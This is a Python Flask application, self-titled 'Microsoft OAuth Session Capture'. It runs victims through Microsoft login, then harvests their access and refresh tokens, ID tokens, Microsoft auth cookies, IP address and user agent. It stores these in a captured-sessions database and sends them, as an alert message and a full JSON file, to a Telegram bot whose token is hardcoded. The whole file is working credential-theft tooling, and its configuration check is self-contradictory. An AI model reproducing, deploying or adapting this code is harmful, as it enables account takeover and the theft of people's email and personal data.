from flask import Flask, request, jsonify, make_response, redirect, url_for, session, send_file
import sqlite3
import datetime
import json
import requests
import uuid
import secrets
from functools import wraps
from werkzeug.middleware.proxy_fix import ProxyFix
import os
import re
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)

DB_NAME = "logs.db"

# ================== TELEGRAM CONFIG ==================
TELEGRAM_BOT_TOKEN = "8734219301:AAGfhOSH3e35l5oJk4tyWuOPM1ao12HHR_k"  # Replace with your actual bot token
TELEGRAM_CHAT_ID = "8689962848"      # Replace with your actual chat ID
# ====================================================

# ================== MICROSOFT LOGIN CONFIG ==================
MICROSOFT_LOGIN_URL = "https://login.live.com/login.srf"
MICROSOFT_REDIRECT_URI = "http://localhost:5000/auth/callback"
CLIENT_ID = "000000004C12AE6F"
# ==============================================================

def send_telegram_message(message, parse_mode='HTML'):
    if TELEGRAM_BOT_TOKEN == "8734219301:AAGfhOSH3e35l5oJk4tyWuOPM1ao12HHR_k" or TELEGRAM_CHAT_ID == "8689962848":
        print("[Telegram] Skipped - Bot token or chat ID not configured")
        return None
    
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": parse_mode}
        response = requests.post(url, json=payload, timeout=10)
        print(f"[Telegram] Sent: {response.status_code}")
        return response.json()
    except Exception as e:
        print(f"[Telegram] Error: {e}")
        return None

def send_telegram_document(filename, caption=""):
    if TELEGRAM_BOT_TOKEN == "8734219301:AAGfhOSH3e35l5oJk4tyWuOPM1ao12HHR_k" or TELEGRAM_CHAT_ID == "8689962848":
        print("[Telegram] Skipped - Bot token or chat ID not configured")
        return None
    
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        with open(filename, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}
            response = requests.post(url, files=files, data=data, timeout=30)
            return response.json()
    except Exception as e:
        print(f"[Telegram] Error sending document: {e}")
        return None

def init_db():
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS captured_sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            email TEXT,
            name TEXT,
            microsoft_tokens TEXT,
            session_cookies TEXT,
            ip TEXT,
            user_agent TEXT,
            telegram_sent INTEGER DEFAULT 0
        )
    ''')
    conn.commit()
    conn.close()

init_db()

def get_client_ip():
    ip = request.headers.get('CF-Connecting-IP')
    if ip:
        return ip.strip()
    ip = request.headers.get('X-Forwarded-For')
    if ip:
        ip = ip.split(',')[0].strip()
    else:
        ip = request.headers.get('X-Real-IP')
    if not ip:
        ip = request.remote_addr
    return ip

@app.route('/')
def home():
    return send_file('index.html')

@app.route('/start_login')
def start_login():
    login_params = {
        'client_id': CLIENT_ID,
        'redirect_uri': MICROSOFT_REDIRECT_URI,
        'response_type': 'code',
        'scope': 'openid profile email User.Read Mail.Read',
        'response_mode': 'query',
        'nonce': secrets.token_hex(16)
    }
    login_url = f"{MICROSOFT_LOGIN_URL}?{ '&'.join([f'{k}={v}' for k, v in login_params.items()]) }"
    return redirect(login_url)

@app.route('/analytics', methods=['POST'])
def analytics():
    try:
        data = request.get_json() if request.is_json else request.form.to_dict()
        print(f"[Analytics] {json.dumps(data)[:200]}")
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        return jsonify({"status": "ok"}), 200

@app.route('/auth/callback')
def auth_callback():
    code = request.args.get('code')
    error = request.args.get('error')
    error_description = request.args.get('error_description')
    
    ip = get_client_ip()
    user_agent = request.headers.get('User-Agent', 'unknown')
    captured_cookies = dict(request.cookies)
    
    if error:
        error_msg = f"Login error: {error} - {error_description}"
        print(f"[ERROR] {error_msg}")
        
        message = f"""
❌ MICROSOFT LOGIN FAILED ❌

IP: {ip}
Error: {error_msg}
Time: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
        send_telegram_message(message)
        
        return f"""
        <html>
        <head><title>Login Failed</title></head>
        <body style="font-family: Arial; text-align: center; padding: 50px;">
            <h1 style="color: red;">Login Failed</h1>
            <p>{error_msg}</p>
            <p><a href="/">Try Again</a></p>
        </body>
        </html>
        """
    
    token_data = exchange_code_for_tokens(code)
    
    session_cookies = {
        'cookie_header': request.headers.get('Cookie', ''),
        'all_cookies': captured_cookies,
        'ms_auth_cookies': {k: v for k, v in captured_cookies.items() if k in ['RPSSecAuth', 'MSPAuth', 'MSPProf', 'MSAP', 'ANON']}
    }
    
    # Save to database
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO captured_sessions 
        (timestamp, email, name, microsoft_tokens, session_cookies, ip, user_agent, telegram_sent)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ''', (
        datetime.datetime.now().isoformat(),
        token_data.get('email', 'Unknown'),
        token_data.get('name', ''),
        json.dumps(token_data),
        json.dumps(session_cookies),
        ip,
        user_agent,
        1
    ))
    conn.commit()
    conn.close()
    
    send_captured_data_to_telegram(token_data, session_cookies, ip, user_agent)
    
    # Set response cookies and return success page
    resp = make_response(f"""
    <html>
    <head>
        <title>Login Successful</title>
        <style>
            body {{ font-family: Arial; text-align: center; padding: 50px; }}
            .success {{ color: green; }}
        </style>
        <meta http-equiv="refresh" content="3;url=/" />
    </head>
    <body>
        <h1 class="success">✓ Login Successful!</h1>
        <p>Redirecting...</p>
    </body>
    </html>
    """)
    
    # Set session cookie
    resp.set_cookie('user_email', token_data.get('email', ''), max_age=86400, path='/')
    resp.set_cookie('session_token', secrets.token_hex(32), max_age=86400, httponly=True, path='/')
    
    return resp

def exchange_code_for_tokens(code):
    token_url = "https://login.live.com/oauth20_token.srf"
    
    data = {
        'client_id': CLIENT_ID,
        'code': code,
        'redirect_uri': MICROSOFT_REDIRECT_URI,
        'grant_type': 'authorization_code'
    }
    
    try:
        response = requests.post(token_url, data=data, timeout=30)
        
        if response.status_code == 200:
            tokens = response.json()
            id_token = tokens.get('id_token')
            user_info = {}
            
            if id_token:
                import base64
                parts = id_token.split('.')
                if len(parts) >= 2:
                    payload = parts[1]
                    payload += '=' * (4 - len(payload) % 4)
                    decoded = base64.b64decode(payload)
                    user_info = json.loads(decoded)
            
            return {
                'success': True,
                'email': user_info.get('email', user_info.get('unique_name', 'Not captured')),
                'name': user_info.get('name', ''),
                'access_token': tokens.get('access_token', ''),
                'refresh_token': tokens.get('refresh_token', ''),
                'id_token': tokens.get('id_token', ''),
                'token_type': tokens.get('token_type', ''),
                'expires_in': tokens.get('expires_in', 0),
                'user_info': user_info
            }
        else:
            return {'success': False, 'error': f"Token exchange failed: {response.status_code}"}
    except Exception as e:
        return {'success': False, 'error': str(e)}

def send_captured_data_to_telegram(token_data, session_cookies, ip, user_agent):
    email = token_data.get('email', 'Unknown')
    name = token_data.get('name', '')
    ms_cookies = session_cookies.get('ms_auth_cookies', {})
    
    message = f"""
🔐 MICROSOFT SESSION CAPTURED! 🔐

━━━━━━━━━━━━━━━━━━━━━━
📧 USER INFORMATION
├─ Email: {email}
├─ Name: {name}
└─ Session Captured: ✅

━━━━━━━━━━━━━━━━━━━━━━
🍪 CAPTURED COOKIES
├─ RPSSecAuth: {'✅' if ms_cookies.get('RPSSecAuth') else '❌'}
├─ MSPAuth: {'✅' if ms_cookies.get('MSPAuth') else '❌'}
├─ MSPProf: {'✅' if ms_cookies.get('MSPProf') else '❌'}
└─ Total Cookies: {len(session_cookies.get('all_cookies', {}))}

━━━━━━━━━━━━━━━━━━━━━━
🔑 TOKENS CAPTURED
├─ Access Token: {'✅' if token_data.get('access_token') else '❌'}
├─ Refresh Token: {'✅' if token_data.get('refresh_token') else '❌'}
└─ Token Type: {token_data.get('token_type', 'N/A')}

━━━━━━━━━━━━━━━━━━━━━━
🌐 CONNECTION INFO
├─ IP Address: {ip}
├─ User Agent: {user_agent[:80]}...
└─ Time: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
━━━━━━━━━━━━━━━━━━━━━━
"""
    
    send_telegram_message(message)
    
    complete_data = {
        "email": email,
        "name": name,
        "ip": ip,
        "user_agent": user_agent,
        "timestamp": datetime.datetime.now().isoformat(),
        "tokens": {
            "access_token": token_data.get('access_token'),
            "refresh_token": token_data.get('refresh_token'),
            "id_token": token_data.get('id_token'),
            "token_type": token_data.get('token_type'),
            "expires_in": token_data.get('expires_in')
        },
        "user_info": token_data.get('user_info', {}),
        "cookies": session_cookies.get('all_cookies', {}),
        "microsoft_auth_cookies": ms_cookies
    }
    
    temp_file = f"session_{email.replace('@', '_')}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(temp_file, 'w') as f:
        json.dump(complete_data, f, indent=2)
    
    send_telegram_document(temp_file, f"Complete session data for {email}")
    os.remove(temp_file)

@app.route('/logout')
def logout():
    resp = make_response(redirect('/'))
    resp.delete_cookie('user_email', path='/')
    resp.delete_cookie('session_token', path='/')
    return resp

if __name__ == '__main__':
    print("=" * 60)
    print("   Microsoft OAuth Session Capture")
    print("=" * 60)
    print(f"Main URL       : http://localhost:5000/")
    print(f"Callback URL   : http://localhost:5000/auth/callback")
    print("=" * 60)
    print("\n[TELEGRAM SETUP]")
    print("1. Update TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in app.py")
    print("=" * 60)
    
    app.run(host='127.0.0.1', port=5000, debug=True, threaded=True)